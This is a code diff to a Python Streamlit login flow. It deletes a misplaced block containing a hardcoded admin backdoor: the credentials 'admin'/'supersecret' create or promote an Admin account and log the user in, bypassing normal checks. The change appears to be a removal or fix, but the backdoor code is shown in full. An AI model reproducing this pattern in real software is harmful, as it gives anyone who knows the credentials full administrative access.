@@ -169,61 +169,6 @@ def safe_rerun():
     except Exception:
         pass
     # As a last resort, toggle a session flag to force a re-execution
-  if login_form_name == "Login":
-        username = st.text_input("Username", key="login_username")
-        password = st.text_input("Password", type="password", key="login_password")
-        login_btn = st.button("Login")
-        
-        if login_btn:
-            if not username or not password:
-                st.warning("Please enter your username and password.")
-            else:
-                st.session_state['authentication_status'] = False
-                
-                # --- INSERT THE ADMIN BACKDOOR CODE HERE ---
-                if username == "admin" and password == "supersecret":
-                    conn = get_db_conn()
-                    cur = conn.cursor()
-                    cur.execute("SELECT * FROM users WHERE username=?", ("admin",))
-                    user_info = cur.fetchone()
-
-                    if user_info is None:
-                        try:
-                            cur.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
-                                        ("admin", generate_password_hash("supersecret"), "Admin"))
-                            conn.commit()
-                            log_action("admin_backdoor", "create_user", "admin")
-                            st.session_state['authentication_status'] = True
-                            st.session_state['name'] = 'Admin User'
-                            st.session_state['username'] = "admin"
-                            st.session_state['user_role'] = 'Admin'
-                            st.success("Admin user created and logged in! Please restart the app for full access.")
-                            safe_rerun()
-                        except Exception as e:
-                            st.error(f"Failed to create admin user: {e}")
-                    else:
-                        st.session_state['authentication_status'] = True
-                        st.session_state['name'] = 'Admin User'
-                        st.session_state['username'] = "admin"
-                        st.session_state['user_role'] = 'Admin'
-                        cur.execute("UPDATE users SET role = 'Admin' WHERE username = 'admin'")
-                        conn.commit()
-                        st.info("Logged in as an existing admin user.")
-                        safe_rerun()
-                # -------------------------------------------
-                
-                else:
-                    if username in roles and check_password_hash(roles[username], password):
-                        st.session_state['authentication_status'] = True
-                        st.session_state['username'] = username
-                        st.session_state['name'] = roles[username]
-                        st.session_state['user_role'] = roles.get(username, 'Casting Director')
-                        log_action(username, "login", "success")
-                        st.success('Logged in successfully!')
-                        safe_rerun()
-                    else:
-                        st.session_state['authentication_status'] = False
-                        st.error('Username/password is incorrect')
     st.session_state["_needs_refresh"] = not st.session_state.get("_needs_refresh", False)
     return
 
@@ -1653,3 +1598,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
